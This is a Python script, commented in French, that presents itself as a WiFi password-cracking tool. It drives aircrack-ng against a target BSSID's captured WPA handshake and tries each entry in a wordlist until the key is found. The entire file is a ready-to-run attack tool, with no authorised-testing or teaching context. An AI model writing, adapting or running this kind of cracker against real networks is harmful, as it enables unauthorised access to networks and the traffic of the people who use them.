#!/usr/bin/python3

import subprocess
import os
import argparse
import time

class WPCrack:
    def __init__(self, bssid: str, pcap_file: str):
        self.bssid = bssid
        self.pcap_file = self.validate_path(pcap_file)
        self.check_aircrack()

    def check_aircrack(self):
        """ Vérifier si Aircrack-ng est installé. """
        try:
            subprocess.run(["aircrack-ng", "--help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except FileNotFoundError:
            raise SystemExit("Erreur: Aircrack-ng n'est pas installé ou introuvable dans le PATH.")

    def try_this_password(self, password: str):
        """ Tente un mot de passe donné. """
        process = subprocess.run(
            ["aircrack-ng", "-b", self.bssid, "-w", "-", self.pcap_file, "--cuda"],
            input=password,
            capture_output=True,
            text=True
        )

        if "KEY FOUND" in process.stdout:
            print(f"\n[✔] Mot de passe trouvé : {password}")
            return password

        return None

    def check_handshake(self):
        """ Vérifie si le fichier de capture contient un handshake valide """
        process = subprocess.run(
            ["aircrack-ng", self.pcap_file],
            capture_output=True,
            text=True
        )
    
        if "1 handshake" in process.stdout.lower() or "2 handshakes" in process.stdout.lower():
            print("[✔] Handshake détecté, prêt pour le brute force.")
            return True
        else:
            print("[✘] Aucun handshake détecté, vérifiez votre fichier de capture.")
            return False

    @staticmethod
    def check_wordlist(wordlist_path):
        """ Vérifie si le fichier de mot de passe est vide """
        if os.path.getsize(wordlist_path) == 0:
            print("[✘] La wordlist est vide, impossible de continuer.")
            return False
        return True

    @staticmethod
    def validate_path(file_path):
        """ Vérifie si un fichier existe et est accessible. """
        if not os.path.exists(file_path):
            raise ValueError(f"Erreur: le fichier '{file_path}' n'existe pas.")
        if not os.path.isfile(file_path):
            raise ValueError(f"Erreur: '{file_path}' n'est pas un fichier.")
        return file_path

def main():
    parser = argparse.ArgumentParser(description="Outil de cracking mot de passe WiFi basé sur Aircrack-ng.")
    parser.add_argument("--bssid", required=True, help="BSSID de la cible.")
    parser.add_argument("--wlst", required=True, help="Fichier wordlist.")
    parser.add_argument("--file", required=True, help="Fichier de capture PCAP.")
    args = parser.parse_args()

    wordlist_path = WPCrack.validate_path(args.wlst)
    pcap_file_path = WPCrack.validate_path(args.file)

    if pcap_file_path.split('.')[-1].lower() not in ('pcap', 'ivs', 'cap'):
        raise ValueError("Format de fichier non supporté (doit être .pcap, .ivs ou .cap).")

    wpcrack = WPCrack(bssid=args.bssid, pcap_file=args.file)
    
    if not wpcrack.check_handshake():
        raise SystemExit("Impossible de continuer, le fichier ne contient pas de handshake valide.")

    if not wpcrack.check_wordlist(wordlist_path):
        raise SystemExit("Impossible de continuer, le fichier de mot de passe est vide.")
    
    try:
        start_time = time.time()
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as wordlist_file:
            for tested, password in enumerate(wordlist_file, start=1):
                password = password.strip()
                result = wpcrack.try_this_password(password)
                elapsed_time = time.time() - start_time
                print(f"\r[⏳] Test {tested} - Temps écoulé : {elapsed_time:.2f}s : {password}", end="")
                if result:
                    print(f"\n\n[✔] Mot de passe trouvé en {elapsed_time:.2f}s : {result}")
                    return
        print("\n[✘] Mot de passe non trouvé.")
    except KeyboardInterrupt:
        print("\n[!] Interruption de l'utilisateur.")
    except Exception as e:
        print(f"\n[Erreur] {e}")

if __name__ == "__main__":
    main()
